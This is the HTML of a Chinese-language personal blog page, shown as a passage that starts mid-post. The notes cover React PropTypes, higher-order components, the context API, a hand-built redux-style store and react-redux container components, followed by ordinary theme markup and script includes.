&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>propTypes 指定了参数类型，但是并没有说这个参数一定要传入，事实上，这些参数默认都是可选的。可选参数可以通过配置 defaultProps，让它在不传入的时候有默认值。<br>但是这里并没有配置 defaultProps，所以如果直接用&lt;Comment /&gt; 而不传入任何参数的话，comment 就会是 undefined，<br>可以通过 isRequired 关键字来强制组件某个参数必须传入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">static propTypes = &#123;</span><br><span class="line">  comment: PropTypes.object.isRequired</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>React.js 提供的 PropTypes 提供了一系列的数据类型可以用来配置组件的参数：<br>PropTypes.array<br>PropTypes.bool<br>PropTypes.func<br>PropTypes.number<br>PropTypes.object<br>PropTypes.string<br>PropTypes.node<br>PropTypes.element</p>
<p><a href="https://reactjs.org/docs/typechecking-with-proptypes.html" target="_blank" rel="noopener">官方文档</a></p>
<h1 id="建议命名和定义顺序"><a href="#建议命名和定义顺序" class="headerlink" title="建议命名和定义顺序"></a>建议命名和定义顺序</h1><p>组件的私有方法都用 _ 开头<br>所有事件监听的方法都用 handle 开头<br>把事件监听方法传给组件的时候，属性名用 on 开头</p>
<p>组件的内容编写顺序如下：</p>
<p>static 开头的类属性，如 defaultProps、propTypes。<br>构造函数，constructor。<br>getter/setter。<br>组件生命周期。<br>_ 开头的私有方法。<br>事件监听方法，handle<em>。<br>render</em>开头的方法，有时候 render() 方法里面的内容会分开到不同函数里面进行，这些函数都以 render* 开头。<br>render() 方法。</p>
<h1 id="高阶组件"><a href="#高阶组件" class="headerlink" title="高阶组件"></a>高阶组件</h1><p>高阶组件就是一个函数，传给它一个组件，它返回一个新的组件,返回的这个新的组件使用传入的组件作为子组件。</p>
<p>高阶组件内部的包装组件和被包装组件之间通过 props 传递数据。</p>
<p>多层高阶组件使用时，this.props是从外向里传递的，即A组件先后被B,C,D组件组装，则this.props到达A组件的顺序是D,C,B,A</p>
<p>高阶组件的作用是用于代码复用，可以把组件之间可复用的代码、逻辑抽离到高阶组件当中。</p>
<p>高阶组件有助于提高我们代码的灵活性，逻辑的复用性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">//高阶组件wrapWithLoadData ,</span><br><span class="line">import React, &#123; Component &#125; from &apos;react&apos;</span><br><span class="line"></span><br><span class="line">export default (WrappedComponent, name) =&gt; &#123;</span><br><span class="line">  class NewComponent extends Component &#123;</span><br><span class="line">    constructor () &#123;</span><br><span class="line">      super()</span><br><span class="line">      this.state = &#123; data: null &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    componentWillMount () &#123;</span><br><span class="line">      let data = localStorage.getItem(name)  //如果改变数据获取方式,可以修改这里</span><br><span class="line">      this.setState(&#123; data &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    //在此之前，可以做很多自定义逻辑</span><br><span class="line">    render () &#123;</span><br><span class="line">      return &lt;WrappedComponent data=&#123;this.state.data&#125; /&gt;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return NewComponent</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//使用</span><br><span class="line">import wrapWithLoadData from &apos;./wrapWithLoadData&apos;</span><br><span class="line"></span><br><span class="line">class InputWithUserName extends Component &#123;</span><br><span class="line">  render () &#123;</span><br><span class="line">    return &lt;input value=&#123;this.props.data&#125; /&gt;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">InputWithUserName = wrapWithLoadData(InputWithUserName, &apos;username&apos;) //组件InputWithUserName以参数传入wrapWithLoadData，进行包装</span><br><span class="line">export default InputWithUserName</span><br></pre></td></tr></table></figure>
<h1 id="context"><a href="#context" class="headerlink" title="context"></a>context</h1><p>一个组件可以通过 getChildContext 方法返回一个对象，这个对象就是子树的 context，提供 context 的组件必须提供 childContextTypes 作为 context 的声明和验证。</p>
<p>如果一个组件设置了 context，那么它的子组件都可以直接访问到里面的内容，它就像这个组件为根的子树的全局变量。任意深度的子组件都可以通过 contextTypes 来声明你想要的 context 里面的哪些状态，然后可以通过 this.context 访问到那些状态。</p>
<p>context 打破了组件和组件之间通过 props 传递数据的规范，极大地增强了组件之间的耦合性。而且，就如全局变量一样，context 里面的数据能被随意接触就能被随意修改，每个组件都能够改 context 里面的内容会导致程序的运行不可预料。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">//组件树的根组件</span><br><span class="line">class Index extends Component &#123;</span><br><span class="line">  static childContextTypes = &#123; //验证getChildContext 返回的对象  必写!!!</span><br><span class="line">    themeColor: PropTypes.string</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  constructor () &#123;</span><br><span class="line">    super()</span><br><span class="line">    this.state = &#123; themeColor: &apos;red&apos; &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  getChildContext () &#123; //设置 context,返回的对象就是子组件的this.context</span><br><span class="line">    return &#123; themeColor: this.state.themeColor &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render () &#123;</span><br><span class="line">    return (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;Header /&gt;</span><br><span class="line">        &lt;Main /&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">//其中一层的子组件</span><br><span class="line">class Title extends Component &#123;</span><br><span class="line">  static contextTypes = &#123; //来声明和验证需要获取的contxt内容的类型 必写!!!</span><br><span class="line">    themeColor: PropTypes.string</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render () &#123;</span><br><span class="line">    return (</span><br><span class="line">      &lt;h1 style=&#123;&#123; color: this.context.themeColor &#125;&#125;&gt;React.js 小书标题&lt;/h1&gt; //直接使用this.context里面的值</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="redux-模式"><a href="#redux-模式" class="headerlink" title="redux 模式"></a>redux 模式</h1><p>代码中发现了共享的状态如果可以被任意修改的话，那么程序的行为将非常不可预料，所以提高了修改数据的门槛：必须通过 dispatch 执行某些允许的修改操作，而且必须大张旗鼓的在 action 里面声明。</p>
<p>这种模式挺好用的，就把它抽象出来一个 createStore，它可以产生 store，里面包含 getState 和 dispatch 函数，方便使用。</p>
<p>后来发现每次修改数据都需要手动重新渲染非常麻烦，因此希望自动重新渲染视图。所以后来加入了订阅者模式，可以通过 store.subscribe 订阅数据修改事件，每次数据更新的时候自动重新渲染视图。</p>
<p>接下来发现了原来的“重新渲染视图”有比较严重的性能问题（没有发生改变的数据也进行了渲染），我们引入了“共享结构的对象”来帮我们解决问题，这样就可以在每个渲染函数的开头进行简单的判断避免没有被修改过的数据重新渲染。</p>
<p>我们优化了 stateChanger 为 reducer，定义了 reducer 只能是纯函数，功能就是负责初始 state，和根据 state 和 action 计算具有共享结构的新的 state。</p>
<p>createStore 现在可以直接拿来用了，套路就是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">function createStore (reducer) &#123;</span><br><span class="line">  let state = null</span><br><span class="line">  const listeners = []</span><br><span class="line">  const subscribe = (listener) =&gt; listeners.push(listener)</span><br><span class="line">  const getState = () =&gt; state</span><br><span class="line">  const dispatch = (action) =&gt; &#123;</span><br><span class="line">    state = reducer(state, action) // 覆盖原对象</span><br><span class="line">    listeners.forEach((listener) =&gt; listener())</span><br><span class="line">  &#125;</span><br><span class="line">  dispatch(&#123;&#125;) // 初始化 state</span><br><span class="line">  return &#123; getState, dispatch, subscribe &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 定一个 reducer</span><br><span class="line">function reducer (state, action) &#123;</span><br><span class="line">  /* 初始化 state 和 switch case */</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 生成 store</span><br><span class="line">const store = createStore(reducer)</span><br><span class="line"></span><br><span class="line">// 监听数据变化重新渲染页面</span><br><span class="line">store.subscribe(() =&gt; renderApp(store.getState()))</span><br><span class="line"></span><br><span class="line">// 首次渲染页面</span><br><span class="line">renderApp(store.getState())</span><br><span class="line"></span><br><span class="line">// 后面可以随意 dispatch 了，页面自动更新</span><br><span class="line">store.dispatch(...)</span><br></pre></td></tr></table></figure></p>
<p>例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">function createStore (reducer) &#123;</span><br><span class="line">  let state = null</span><br><span class="line">  const listeners = []</span><br><span class="line">  const subscribe = (listener) =&gt; listeners.push(listener)</span><br><span class="line">  const getState = () =&gt; state</span><br><span class="line">  const dispatch = (action) =&gt; &#123;</span><br><span class="line">    state = reducer(state, action) // 覆盖原对象</span><br><span class="line">    listeners.forEach((listener) =&gt; listener())</span><br><span class="line">  &#125;</span><br><span class="line">  dispatch(&#123;&#125;) // 初始化 state</span><br><span class="line">  return &#123; getState, dispatch, subscribe &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function renderApp (newAppState, oldAppState = &#123;&#125;) &#123; // 防止 oldAppState 没有传入，所以加了默认参数 oldAppState = &#123;&#125;</span><br><span class="line">  if (newAppState === oldAppState) return // 数据没有变化就不渲染了</span><br><span class="line">  console.log(&apos;render app...&apos;)</span><br><span class="line">  renderTitle(newAppState.title, oldAppState.title)</span><br><span class="line">  renderContent(newAppState.content, oldAppState.content)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function renderTitle (newTitle, oldTitle = &#123;&#125;) &#123;</span><br><span class="line">  if (newTitle === oldTitle) return // 数据没有变化就不渲染了</span><br><span class="line">  console.log(&apos;render title...&apos;)</span><br><span class="line">  const titleDOM = document.getElementById(&apos;title&apos;)</span><br><span class="line">  titleDOM.innerHTML = newTitle.text</span><br><span class="line">  titleDOM.style.color = newTitle.color</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function renderContent (newContent, oldContent = &#123;&#125;) &#123;</span><br><span class="line">  if (newContent === oldContent) return // 数据没有变化就不渲染了</span><br><span class="line">  console.log(&apos;render content...&apos;)</span><br><span class="line">  const contentDOM = document.getElementById(&apos;content&apos;)</span><br><span class="line">  contentDOM.innerHTML = newContent.text</span><br><span class="line">  contentDOM.style.color = newContent.color</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function stateChanger (state, action) &#123;</span><br><span class="line">   if (!state) &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      title: &#123;</span><br><span class="line">        text: &apos;React.js lalalal&apos;,</span><br><span class="line">        color: &apos;red&apos;,</span><br><span class="line">      &#125;,</span><br><span class="line">      content: &#123;</span><br><span class="line">        text: &apos;React.js content&apos;,</span><br><span class="line">        color: &apos;blue&apos;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  switch (action.type) &#123;</span><br><span class="line">    case &apos;UPDATE_TITLE_TEXT&apos;:</span><br><span class="line">      return &#123; // 构建新的对象并且返回</span><br><span class="line">        ...state,</span><br><span class="line">        title: &#123;</span><br><span class="line">          ...state.title,</span><br><span class="line">          text: action.text</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    case &apos;UPDATE_TITLE_COLOR&apos;:</span><br><span class="line">      return &#123; // 构建新的对象并且返回</span><br><span class="line">        ...state,</span><br><span class="line">        title: &#123;</span><br><span class="line">          ...state.title,</span><br><span class="line">          color: action.color</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    default:</span><br><span class="line">      return state // 没有修改，返回原来的对象</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const store = createStore(stateChanger)</span><br><span class="line">let oldState = store.getState() // 缓存旧的 state</span><br><span class="line">store.subscribe(() =&gt; &#123;</span><br><span class="line">  const newState = store.getState() // 数据可能变化，获取新的 state</span><br><span class="line">  renderApp(newState, oldState) // 把新旧的 state 传进去渲染</span><br><span class="line">  oldState = newState // 渲染完以后，新的 newState 变成了旧的 oldState，等待下一次数据变化重新渲染</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">renderApp(store.getState()) // 首次渲染页面</span><br><span class="line">store.dispatch(&#123; type: &apos;UPDATE_TITLE_TEXT&apos;, text: &apos;《React.js is so cool!》&apos; &#125;) // 修改标题文本</span><br><span class="line">store.dispatch(&#123; type: &apos;UPDATE_TITLE_COLOR&apos;, color: &apos;blue&apos; &#125;) // 修改标题颜色</span><br></pre></td></tr></table></figure></p>
<h1 id="react-redux"><a href="#react-redux" class="headerlink" title="react-redux"></a>react-redux</h1><p>使用Context和redux实现根据共享状态进行子组件渲染的工作</p>
<p><a href="https://github.com/YooHannah/make-react-redux/blob/master/src/index.js" target="_blank" rel="noopener">index.js</a></p>
<p><a href="https://github.com/YooHannah/make-react-redux/blob/master/src/react-redux.js" target="_blank" rel="noopener">react-redux.js</a></p>
<p><a href="https://github.com/YooHannah/make-react-redux/blob/master/src/ThemeSwitch.js" target="_blank" rel="noopener">ThemeSwitch.js</a></p>
<p><a href="https://github.com/YooHannah/make-react-redux/blob/master/src/Content.js" target="_blank" rel="noopener">Content.js</a></p>
<p><a href="https://github.com/YooHannah/make-react-redux/blob/master/src/Header.js" target="_blank" rel="noopener">Header.js</a></p>
<p>使用真正的react-redux<br>即<br>import { connect } from ‘react-redux’<br>import { createStore } from ‘redux’<br>import { Provider } from ‘react-redux’</p>
<p>根据是否需要高度的复用性，把组件划分为 Dumb 和 Smart 组件，约定俗成地把它们分别放到 components 和 containers 目录下。</p>
<p>Dumb 基本只做一件事情 —— 根据 props 进行渲染。而 Smart 则是负责应用的逻辑、数据，把所有相关的 Dumb（Smart）组件组合起来，通过 props 控制它们。</p>
<p>Smart 组件可以使用 Smart、Dumb 组件；而 Dumb 组件最好只使用 Dumb 组件，否则它的复用性就会丧失。</p>
<p>要根据应用场景不同划分组件，如果一个组件并不需要太强的复用性，直接让它成为 Smart 即可；否则就让它成为 Dumb 组件。</p>
<p>还有一点要注意，Smart 组件并不意味着完全不能复用，Smart 组件的复用性是依赖场景的，在特定的应用场景下是当然是可以复用 Smart 的。而 Dumb 则是可以跨应用场景复用，Smart 和 Dumb 都可以复用，只是程度、场景不一样。</p>
<p>例如将ThemeSwitch拆分成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">/* src/components/ThemeSwitch.js */</span><br><span class="line">import React, &#123; Component, PropTypes &#125; from &apos;react&apos;</span><br><span class="line"></span><br><span class="line">export default class ThemeSwitch extends Component &#123;</span><br><span class="line">  static propTypes = &#123;</span><br><span class="line">    themeColor: PropTypes.string,</span><br><span class="line">    onSwitchColor: PropTypes.func</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  handleSwitchColor (color) &#123;</span><br><span class="line">    if (this.props.onSwitchColor) &#123;</span><br><span class="line">      this.props.onSwitchColor(color)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render () &#123;</span><br><span class="line">    return (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;button</span><br><span class="line">          style=&#123;&#123; color: this.props.themeColor &#125;&#125;</span><br><span class="line">          onClick=&#123;this.handleSwitchColor.bind(this, &apos;red&apos;)&#125;&gt;Red&lt;/button&gt;</span><br><span class="line">        &lt;button</span><br><span class="line">          style=&#123;&#123; color: this.props.themeColor &#125;&#125;</span><br><span class="line">          onClick=&#123;this.handleSwitchColor.bind(this, &apos;blue&apos;)&#125;&gt;Blue&lt;/button&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* src/containers/ThemeSwitch.js */</span><br><span class="line"></span><br><span class="line">import &#123; connect &#125; from &apos;react-redux&apos;</span><br><span class="line">import ThemeSwitch from &apos;../components/ThemeSwitch&apos;</span><br><span class="line"></span><br><span class="line">const mapStateToProps = (state) =&gt; &#123;</span><br><span class="line">  return &#123;</span><br><span class="line">    themeColor: state.themeColor</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">const mapDispatchToProps = (dispatch) =&gt; &#123;</span><br><span class="line">  return &#123;</span><br><span class="line">    onSwitchColor: (color) =&gt; &#123;</span><br><span class="line">      dispatch(&#123; type: &apos;CHANGE_COLOR&apos;, themeColor: color &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">export default connect(mapStateToProps, mapDispatchToProps)(ThemeSwitch)</span><br></pre></td></tr></table></figure></p>
<p><a href="http://huziketang.com/books/react/lesson1" target="_blank" rel="noopener">学习资料链接</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/13/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><span class="page-number current">14</span><a class="page-number" href="/page/15/">15</a><span class="space">&hellip;</span><a class="page-number" href="/page/24/">24</a><a class="extend next" rel="next" href="/page/15/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image" src="/psb.jpg" alt="YooHannah">
          <p class="site-author-name" itemprop="name">YooHannah</p>
          <p class="site-description motion-element" itemprop="description"></p>
        </div>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">240</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          
            <div class="site-state-item site-state-categories">
              <a href="/categories">
                <span class="site-state-item-count">1</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">21</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
        </div>

        
        

        
        

        


      </section>

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">YooHannah</span>
</div>


<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Pisces
  </a>
</div>


        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  



  



  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>

  
  <script type="text/javascript" src="/lib/treedocument/treedocument.js"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.0"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>



  



  




	




  
  

  

  

  

  


</body>
</html>
